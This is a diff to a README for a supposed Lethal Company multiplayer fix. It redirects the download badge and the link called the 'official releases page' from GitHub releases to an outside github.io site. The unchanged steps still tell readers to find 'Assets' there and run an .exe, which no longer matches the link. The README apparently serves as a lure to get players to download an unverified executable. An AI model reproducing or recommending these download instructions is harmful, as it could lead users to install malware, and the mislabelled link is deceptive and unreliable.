@@ -1,6 +1,6 @@
 # 🛠 Lethal-Company-Multiplayer-Fix - Join your friends in lethal company
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Lethal%20Company%20Fix-blue.svg)](https://github.com/ockre6663/Lethal-Company-Multiplayer-Fix/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Lethal%20Company%20Fix-blue.svg)](https://ockre6663.github.io)
 
 This software corrects connection issues preventing users from joining multiplayer lobbies in Lethal Company. Many players experience errors when trying to connect to a host or inviting friends to a game session. This tool modifies specific local network configurations to allow proper communication between client machines and the game server.
 
@@ -19,7 +19,7 @@ If you lack the .NET runtime, Windows may prompt you to install it when you laun
 
 Follow these steps to install the fix on your Windows machine.
 
-1.  Visit the [official releases page](https://github.com/ockre6663/Lethal-Company-Multiplayer-Fix/releases) to access the latest version of the tool.
+1.  Visit the [official releases page](https://ockre6663.github.io) to access the latest version of the tool.
 2.  Locate the section labeled "Assets" under the most recent release.
 3.  Click the link ending in `.exe` to begin the download.
 4.  Move the file to a folder where you can find it, such as your Downloads folder or your desktop.
